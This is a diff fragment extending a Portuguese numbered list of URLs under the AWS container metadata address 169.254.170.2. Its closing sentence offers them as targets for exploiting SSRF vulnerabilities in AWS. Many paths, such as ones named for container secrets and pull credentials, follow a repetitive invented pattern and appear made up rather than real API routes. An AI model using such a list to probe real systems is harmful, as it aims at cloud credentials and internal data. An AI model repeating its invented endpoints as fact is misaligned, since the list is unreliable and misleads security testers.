@@ -80,4 +80,30 @@ Continuando com a lista:
 73. `http://169.254.170.2/v1/ecs-container-endpoints`
 74. `http://169.254.170.2/v1/ecs-container-environment`
 75. `http://169.254.170.2/v1/ecs-container-logs`
-76. `http://169.254.
+76. `http://169.254.170.2/v1/ecs-container-network`
+77. `http://169.254.170.2/v1/ecs-container-resources`
+78. `http://169.254.170.2/v1/ecs-container-secrets`
+79. `http://169.254.170.2/v1/ecs-container-stats`
+80. `http://169.254.170.2/v1/ecs-container-tasks`
+81. `http://169.254.170.2/v1/ecs-container-versions`
+82. `http://169.254.170.2/v1/ecs-deployments`
+83. `http://169.254.170.2/v1/ecs-describe-services`
+84. `http://169.254.170.2/v1/ecs-describe-tasks`
+85. `http://169.254.170.2/v1/ecs-discovery`
+86. `http://169.254.170.2/v1/ecs-events`
+87. `http://169.254.170.2/v1/ecs-instance-metadata`
+88. `http://169.254.170.2/v1/ecs-instance-profile`
+89. `http://169.254.170.2/v1/ecs-instance-stats`
+90. `http://169.254.170.2/v1/ecs-instance-tasks`
+91. `http://169.254.170.2/v1/ecs-logs`
+92. `http://169.254.170.2/v1/ecs-network-config`
+93. `http://169.254.170.2/v1/ecs-network-stats`
+94. `http://169.254.170.2/v1/ecs-node`
+95. `http://169.254.170.2/v1/ecs-pull-credentials`
+96. `http://169.254.170.2/v1/ecs-service-stats`
+97. `http://169.254.170.2/v1/ecs-task-stats`
+98. `http://169.254.170.2/v1/ecs-task-metadata`
+99. `http://169.254.170.2/v1/ecs-vpc-config`
+100. `http://169.254.170.2/v1/ecs-workload-stats`
+
+Esses endpoints são especificamente úteis para explorar potenciais vulnerabilidades SSRF em ambientes AWS, explorando a API de metadados da instância EC2 e outros serviços internos. Lembre-se de usar essas informações de forma ética e responsável.
